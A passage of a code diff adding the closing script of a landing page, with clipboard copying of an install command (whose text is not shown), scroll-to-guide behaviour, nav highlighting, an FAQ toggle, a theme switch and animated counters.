+            sel.addRange(prevSelection);
+        }
+        return ok;
+    }
+
+    function copyToClipboard(text) {
+        // Try the synchronous path first — it's the one that works in
+        // Google Sites and other iframe hosts.
+        if (execCommandCopy(text)) return Promise.resolve();
+        // Then try the modern async API.
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            return navigator.clipboard.writeText(text);
+        }
+        return Promise.reject(new Error('clipboard unavailable'));
+    }
+
+    // ──────────────────────────────────────────────────────────────
+    // Copy main command — flash feedback, then glide down to the guide
+    // ──────────────────────────────────────────────────────────────
+    function copyCommand() {
+        const btn = document.getElementById('copyBtn');
+        const copyIcon = document.getElementById('copyIcon');
+        const checkIcon = document.getElementById('checkIcon');
+        const text = document.getElementById('copyText');
+
+        const showCopied = () => {
+            btn.classList.add('copied');
+            copyIcon.style.display = 'none';
+            checkIcon.style.display = 'block';
+            text.textContent = 'Copied!';
+            setTimeout(() => {
+                btn.classList.remove('copied');
+                copyIcon.style.display = 'block';
+                checkIcon.style.display = 'none';
+                text.textContent = 'Copy';
+            }, 2000);
+        };
+
+        const selectVisibleAsFallback = () => {
+            // Last resort: highlight the command so the user can ⌘C manually.
+            const el = document.getElementById('installCmd');
+            if (!el) return;
+            const range = document.createRange();
+            range.selectNodeContents(el);
+            const sel = window.getSelection();
+            sel.removeAllRanges();
+            sel.addRange(range);
+        };
+
+        copyToClipboard(INSTALL_COMMAND).then(showCopied, () => {
+            selectVisibleAsFallback();
+            showCopied();
+        });
+
+        // Smooth-scroll down to the step-by-step guide so the user
+        // immediately sees what to do next.
+        const guide = document.getElementById('guide');
+        if (guide) guide.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    // Kept for compatibility; CTA in this page is not wired but some
+    // authors may re-enable it — it now reads from INSTALL_COMMAND too.
+    function copyCtaCmd(el) {
+        const code = el.querySelector('code');
+        const orig = code.textContent;
+        copyToClipboard(INSTALL_COMMAND).finally(() => {
+            code.textContent = 'Copied to clipboard!';
+            el.style.borderColor = 'rgba(74, 222, 128, 0.4)';
+            setTimeout(() => { code.textContent = orig; el.style.borderColor = ''; }, 2000);
+        });
+    }
+
+    // Copy from the guide section (step 2). Same mechanics as the hero
+    // button, but no scroll — the user is already at the guide.
+    function copyCommandGuide() {
+        const btn = document.getElementById('guideCopyBtn');
+        const copyIcon = document.getElementById('guideCopyIcon');
+        const checkIcon = document.getElementById('guideCheckIcon');
+        const text = document.getElementById('guideCopyText');
+
+        const showCopied = () => {
+            btn.classList.add('copied');
+            copyIcon.style.display = 'none';
+            checkIcon.style.display = 'block';
+            text.textContent = 'Copied!';
+            setTimeout(() => {
+                btn.classList.remove('copied');
+                copyIcon.style.display = 'block';
+                checkIcon.style.display = 'none';
+                text.textContent = 'Copy';
+            }, 2000);
+        };
+
+        const selectVisibleAsFallback = () => {
+            const el = document.getElementById('guideCmd');
+            if (!el) return;
+            const range = document.createRange();
+            range.selectNodeContents(el);
+            const sel = window.getSelection();
+            sel.removeAllRanges();
+            sel.addRange(range);
+        };
+
+        copyToClipboard(INSTALL_COMMAND).then(showCopied, () => {
+            selectVisibleAsFallback();
+            showCopied();
+        });
+    }
+
+    // Nav scroll
+    const nav = document.getElementById('nav');
+    window.addEventListener('scroll', () => {
+        nav.classList.toggle('scrolled', window.scrollY > 20);
+    });
+
+    // Active nav pill
+    const sections = document.querySelectorAll('section[id]');
+    const navPills = document.querySelectorAll('.nav-pill');
+    window.addEventListener('scroll', () => {
+        let current = '';
+        sections.forEach(s => {
+            if (window.scrollY >= s.offsetTop - 200) current = s.id;
+        });
+        navPills.forEach(p => {
+            p.classList.remove('active');
+            if (p.getAttribute('href') === '#' + current) p.classList.add('active');
+        });
+    });
+
+    // Reveals
+    const observer = new IntersectionObserver(entries => {
+        entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+    }, { threshold: 0.08 });
+
+    document.querySelectorAll('.reveal, .reveal-stagger').forEach(el => observer.observe(el));
+
+    // FAQ
+    function toggleFaq(btn) {
+        const item = btn.closest('.faq-item');
+        const wasOpen = item.classList.contains('open');
+        document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
+        if (!wasOpen) item.classList.add('open');
+    }
+
+    // Theme toggle
+    const toggle = document.getElementById('themeToggle');
+    const sunIcon = document.getElementById('sunIcon');
+    const moonIcon = document.getElementById('moonIcon');
+    let dark = false;
+
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        dark = true;
+        document.documentElement.setAttribute('data-theme', 'dark');
+        sunIcon.style.display = 'none';
+        moonIcon.style.display = 'block';
+    }
+
+    toggle.addEventListener('click', () => {
+        dark = !dark;
+        document.documentElement.setAttribute('data-theme', dark ? 'dark' : '');
+        sunIcon.style.display = dark ? 'none' : 'block';
+        moonIcon.style.display = dark ? 'block' : 'none';
+    });
+
+    // Animated counters
+    function animateCounters() {
+        document.querySelectorAll('.stat-number').forEach(el => {
+            const target = parseFloat(el.dataset.target);
+            const suffix = el.dataset.suffix || '';
+            const isDecimal = el.dataset.decimal === 'true';
+            const duration = 1500;
+            const start = performance.now();
+
+            function update(now) {
+                const elapsed = now - start;
+                const progress = Math.min(elapsed / duration, 1);
+                const eased = 1 - Math.pow(1 - progress, 3);
+                const current = eased * target;
+                el.textContent = (isDecimal ? current.toFixed(1) : Math.floor(current)) + suffix;
+                if (progress < 1) requestAnimationFrame(update);
+            }
+
+            requestAnimationFrame(update);
+        });
+    }
+
+    const statsObserver = new IntersectionObserver(entries => {
+        entries.forEach(e => {
+            if (e.isIntersecting) { animateCounters(); statsObserver.unobserve(e.target); }
+        });
+    }, { threshold: 0.5 });
+
+    statsObserver.observe(document.querySelector('.stats-row'));
+</script>
+
+</body>
+</html>
